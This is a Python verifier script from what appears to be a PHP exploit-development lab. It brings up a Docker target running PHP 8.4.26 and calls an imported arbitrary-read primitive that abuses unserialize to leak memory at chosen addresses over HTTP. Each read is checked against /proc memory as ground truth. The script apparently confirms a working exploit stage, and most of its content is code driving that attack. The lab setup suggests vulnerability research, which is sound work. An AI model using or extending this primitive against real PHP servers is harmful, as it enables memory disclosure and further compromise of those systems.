#!/usr/bin/env python3
"""Verifier for var_hash_rw.py: arbitrary-read of a chosen address on live PHP.

Proves the documented result: ArbRead.isstring_read(T-0x18) returns the bytes at
a chosen RW address T (and the zend_string length at T-0x08) via the
controlled-value unserialize write. Ground truth is /proc/<pid>/mem read back at
the same T (proc_gdb.dump_mem); the read itself is black-box HTTP. Targets stable
executor_globals pointer slots (RW; the module cannot read RO pages).

Lab bring-up / teardown (committed rvt profile, cli php 8.4.26, host port 8172):
    docker compose -f docker-compose.versions.yml -p vgen-rvt --profile rvt up -d --build
    python3 -I poc/primitives/read_leak/verify_var_hash_rw.py --project vgen-rvt
    docker compose -f docker-compose.versions.yml -p vgen-rvt --profile rvt down
(container p2s-rvt-cli, PID 1 = php -S worker; --service/--project default here.)
"""
from __future__ import annotations

import argparse
import importlib.util
import os
import subprocess
import sys
import time
import urllib.request

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
_ROOT = os.path.dirname(_POC_ROOT)
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)


def _load(name, filename):
    path = os.path.join(_HERE, filename)
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    sys.modules.setdefault(name, mod)
    spec.loader.exec_module(mod)
    return mod


A = _load("var_hash_rw", "var_hash_rw.py")               # module under test
R5 = _load("functable_resolver", "functable_resolver.py")  # bootstrap + EG_OFF/HT_POST_OFF
from common.offsets import BUILTIN_OFFSETS  # noqa: E402
from common import proc_gdb  # noqa: E402

COMPOSE = os.path.join(_ROOT, "docker-compose.versions.yml")
ZSTR_VAL = 0x18
# executor_globals pointer slots whose preceding qword is a pointer (large len
# -> the sidtail read returns a full window); any one matching /proc proves it.
EG_SLOT_CANDS = (0x1B0, 0x1C8, 0x1A8, 0x1D0, 0x200, 0x8)


def _cli_up(port):
    try:
        urllib.request.urlopen("http://127.0.0.1:%d/index.php" % port, timeout=4).read()
        return True
    except Exception:
        return False


def ensure_lab(compose, project, port):
    if _cli_up(port):
        print("[lab] rvt lab already up (cli :%d)" % port)
        return True
    print("[lab] bringing rvt up (-p %s --profile rvt)" % project)
    subprocess.run(["docker", "compose", "-f", compose, "-p", project,
                    "--profile", "rvt", "up", "-d", "--build"], cwd=_ROOT,
                   capture_output=True)
    for _ in range(90):
        if _cli_up(port):
            return True
        time.sleep(1)
    return False


def main(argv=None):
    ap = argparse.ArgumentParser(description="verify var_hash_rw arbitrary read")
    ap.add_argument("--compose-file", default=COMPOSE)
    ap.add_argument("--project", default="p2s-rvt")
    ap.add_argument("--service", default="rvt-cli-vuln")
    ap.add_argument("--url", default="http://127.0.0.1")
    ap.add_argument("--port", type=int, default=8172)
    ap.add_argument("--down", action="store_true")
    a = ap.parse_args(argv)

    os.environ["COMPOSE_FILE"] = a.compose_file
    os.environ["COMPOSE_PROJECT_NAME"] = a.project

    print("=" * 78)
    print("VERIFY var_hash_rw (arbitrary read of a chosen addr, service=%s)" % a.service)
    print("=" * 78)
    if not ensure_lab(a.compose_file, a.project, a.port):
        print("[FAIL] could not bring the rvt lab up")
        return 2

    binbase, chunk = R5.bootstrap(a.service, a.url)
    if not binbase or not chunk:
        print("[FAIL] bootstrap: binbase=%s chunk=%s" % (binbase, chunk))
        return 2
    off = BUILTIN_OFFSETS["8.4.26"]
    aoff = chunk + off["a_off"]
    seed = {"chunk": chunk, "binbase": binbase, "a": aoff,
            "copy": aoff + off["copy_off"], "sid": aoff + off["sid_off"],
            "ht_post": chunk + R5.HT_POST_OFF["cli"],
            "bg_unserialize_off": off["bg_unserialize_off"]}
    rdr = A.ArbRead(a.url, seed, service=a.service, want_sidpath=True,
                    survive=True, verbose=False)
    eg = binbase + R5.EG_OFF["cli"]
    print("[*] binbase=%#x chunk=%#x EG=%#x" % (binbase, chunk, eg))

    matched = None
    for slot in EG_SLOT_CANDS:
        T = eg + slot
        r = rdr.isstring_read(T - ZSTR_VAL)
        if not r or len(r[1]) < 8:
            print("  EG+%#x: read -> %s (short/miss)"
                  % (slot, None if not r else "len=%d bytes=%d" % (r[0], len(r[1]))))
            continue
        got = int.from_bytes(r[1][:8], "little")
        gt_b = proc_gdb.dump_mem(a.compose_file, a.service, 1, T, 8)
        gt = int.from_bytes(gt_b, "little") if len(gt_b) >= 8 else None
        ok = gt is not None and got == gt and got != 0
        print("  EG+%#x: read=%#x  /proc=%s  match=%s"
              % (slot, got, hex(gt) if gt is not None else None, ok))
        if ok:
            matched = (T, got)
            break

    print("-" * 78)
    passed = matched is not None
    if passed:
        print("  [PASS] arbitrary read of chosen addr %#x == /proc ground truth (%#x)"
              % matched)
    else:
        print("  [FAIL] no EG slot read matched /proc ground truth")
    print("  VERDICT: %s" % ("PASS" if passed else "FAIL"))

    if a.down:
        subprocess.run(["docker", "compose", "-f", a.compose_file, "-p", a.project,
                        "--profile", "rvt", "down"], cwd=_ROOT, capture_output=True)
    return 0 if passed else 1


if __name__ == "__main__":
    raise SystemExit(main())
